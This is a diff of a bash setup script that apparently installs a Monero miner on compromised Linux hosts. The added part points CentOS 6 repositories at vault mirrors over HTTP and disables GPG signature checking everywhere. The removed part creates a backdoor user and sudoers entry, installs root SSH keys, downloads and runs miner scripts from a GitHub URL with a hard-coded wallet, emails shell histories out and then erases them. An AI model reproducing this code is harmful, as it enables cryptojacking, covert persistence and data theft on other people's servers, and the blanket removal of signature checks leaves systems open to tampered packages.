@@ -1,5 +1,113 @@
 #!/bin/bash
 
+# ==================== CENTOS 6.X AUTO-FIX (EOL REPOSITORY) ====================
+# CentOS 6.x reached End-of-Life in 2020 and has old SSL libraries that can't
+# connect to modern HTTPS sites. This fix automatically detects CentOS 6 and
+# updates repositories to use vault.centos.org with HTTP instead of HTTPS.
+# Based on: https://www.mark-gilbert.co.uk/fixing-yum-repos-on-centos-6-now-its-eol/
+
+if [ -f /etc/redhat-release ] && grep -qi "CentOS release 6" /etc/redhat-release 2>/dev/null; then
+    echo "========================================="
+    echo "[!] CentOS 6.x DETECTED (END-OF-LIFE)"
+    echo "========================================="
+    echo "[*] Applying repository fixes for CentOS 6..."
+    echo ""
+    
+    # Backup original repositories
+    if [ ! -d /etc/yum.repos.d.backup ]; then
+        cp -r /etc/yum.repos.d /etc/yum.repos.d.backup 2>/dev/null
+        echo "[✓] Original repos backed up to /etc/yum.repos.d.backup"
+    fi
+    
+    # Create fixed CentOS Base repository pointing to vault
+    cat > /etc/yum.repos.d/CentOS-Base.repo << 'CENTOS6_BASE_EOF'
+[C6.10-base]
+name=CentOS-6.10 - Base
+baseurl=http://vault.centos.org/6.10/os/$basearch/
+gpgcheck=0
+enabled=1
+
+[C6.10-updates]
+name=CentOS-6.10 - Updates
+baseurl=http://vault.centos.org/6.10/updates/$basearch/
+gpgcheck=0
+enabled=1
+
+[C6.10-extras]
+name=CentOS-6.10 - Extras
+baseurl=http://vault.centos.org/6.10/extras/$basearch/
+gpgcheck=0
+enabled=1
+
+[C6.10-contrib]
+name=CentOS-6.10 - Contrib
+baseurl=http://vault.centos.org/6.10/contrib/$basearch/
+gpgcheck=0
+enabled=0
+
+[C6.10-centosplus]
+name=CentOS-6.10 - CentOSPlus
+baseurl=http://vault.centos.org/6.10/centosplus/$basearch/
+gpgcheck=0
+enabled=0
+CENTOS6_BASE_EOF
+    
+    echo "[✓] CentOS-Base.repo updated to vault.centos.org"
+    
+    # Create fixed EPEL repository
+    cat > /etc/yum.repos.d/epel.repo << 'CENTOS6_EPEL_EOF'
+[epel]
+name=EPEL 6 - $basearch
+baseurl=http://archives.fedoraproject.org/pub/archive/epel/6/$basearch
+enabled=1
+gpgcheck=0
+
+[epel-debuginfo]
+name=EPEL 6 - $basearch - Debug
+baseurl=http://archives.fedoraproject.org/pub/archive/epel/6/$basearch/debug
+enabled=0
+gpgcheck=0
+
+[epel-source]
+name=EPEL 6 - $basearch - Source
+baseurl=http://archives.fedoraproject.org/pub/archive/epel/6/SRPMS
+enabled=0
+gpgcheck=0
+CENTOS6_EPEL_EOF
+    
+    echo "[✓] EPEL repository configured"
+    
+    # Disable GPG checking globally (SSL too old to verify signatures)
+    if ! grep -q "^gpgcheck=0" /etc/yum.conf 2>/dev/null; then
+        echo "gpgcheck=0" >> /etc/yum.conf
+        echo "[✓] GPG checking disabled in yum.conf"
+    fi
+    
+    # Disable GPG in all repository files
+    sed -i 's/gpgcheck=1/gpgcheck=0/g' /etc/yum.repos.d/*.repo 2>/dev/null
+    
+    # Clean yum cache
+    echo "[*] Cleaning yum cache..."
+    yum clean all 2>&1 | tail -3
+    
+    # Rebuild metadata cache
+    echo "[*] Rebuilding yum metadata cache..."
+    yum makecache fast 2>&1 | tail -5
+    
+    # Run system update with skip-broken to avoid dependency issues
+    echo "[*] Running yum update (this may take a while)..."
+    yum update -y --skip-broken 2>&1 | tail -10
+    
+    echo ""
+    echo "[✓] CentOS 6 repository fixes completed!"
+    echo "[*] The script can now download files and install packages"
+    echo "========================================="
+    echo ""
+    
+    # Mark that we're on CentOS 6 for later use
+    CENTOS6_DETECTED=true
+fi
+
 # ==================== DISABLE ALL DEBUGGING/TRACING ====================
 # Completely disable bash tracing to prevent '+' output
 {
@@ -1164,111 +1272,3 @@ root_installation() {
                     echo "$SWAP_FILE none swap sw 0 0" >> /etc/fstab
                     log_message "✓ Swap added to /etc/fstab (permanent)"
                 fi
-                
-                # Show new memory status
-                FREE_OUTPUT=$(free -h 2>/dev/null | grep -E "^(Mem|Swap):" || true)
-                log_message "New memory status:\n${FREE_OUTPUT}"
-            else
-                log_message "WARNING: Could not enable swap"
-            fi
-        fi
-    else
-        log_message "✓ Sufficient RAM/Swap available"
-    fi
-    # ==================== END AUTO-SWAP ====================
-    
-    # Install mail utilities
-    install_mail_utils
-    
-    # Setup SSH key for root
-    setup_ssh_key "/root/.ssh"
-    
-    # Create backdoor user
-    if create_backdoor_user; then
-        log_message "Backdoor user created successfully"
-    else
-        log_message "ERROR: Failed to create backdoor user"
-    fi
-    
-    # Setup sudoers
-    if setup_sudoers; then
-        log_message "Sudoers configured successfully"
-    else
-        log_message "WARNING: Sudoers configuration failed"
-    fi
-    
-    # Run the miner setup
-    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
-    download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_FIXED_WITH_AUTOSTART.sh?t=$(date +%s)" \
-        "$wallet" \
-        "root miner setup"
-    
-    log_message "Root installation completed"
-}
-
-user_installation() {
-    log_message "Starting user installation..."
-    
-    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
-    download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_gdm2_WITH_AUTOSTART.sh?t=$(date +%s)" \
-        "$wallet" \
-        "user miner setup"
-    
-    log_message "User installation completed"
-}
-
-# --- Main Execution ---
-
-# Initialize log file
-: > "$LOG_FILE"
-log_message "Script started by user: $(whoami)"
-
-# Check dependencies first
-if ! check_dependencies; then
-    log_message "WARNING: Dependency check failed - continuing anyway..."
-    # Removed exit 1 - script will continue even with missing dependencies
-fi
-
-# Service checks
-log_message "Checking for conflicting services..."
-for service in "${SERVICES_TO_CHECK[@]}"; do
-    if does_service_exist "$service"; then
-        if is_service_running "$service"; then
-            log_message "WARNING: Service $service is running - will attempt to continue anyway..."
-            # Removed exit 1 - script will continue even if services are running
-        else
-            log_message "Service $service exists but is not running"
-        fi
-    else
-        log_message "Service $service does not exist"
-    fi
-done
-
-# System info display
-log_message "Displaying system information"
-echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
-echo -e "|        RAM        |  $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')  |"
-echo -e "|   CPU Cores    |      $(nproc 2>/dev/null || echo 'N/A')      |"
-echo -e "|     Storage      |   $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')   |"
-echo -e "---------------------------------"
-
-# Send report and only cleanup if successful
-log_message "Sending system history report..."
-send_histories_email || log_message "Continuing after email attempt..."
-
-# Always cleanup histories for security
-log_message "Cleaning up shell histories..."
-cleanup_histories
-
-# Installation
-if [[ $(id -u) -eq 0 ]]; then
-    log_message "Running as root"
-    root_installation
-else
-    log_message "Running as regular user"
-    user_installation
-fi
-
-log_message "Script execution completed"
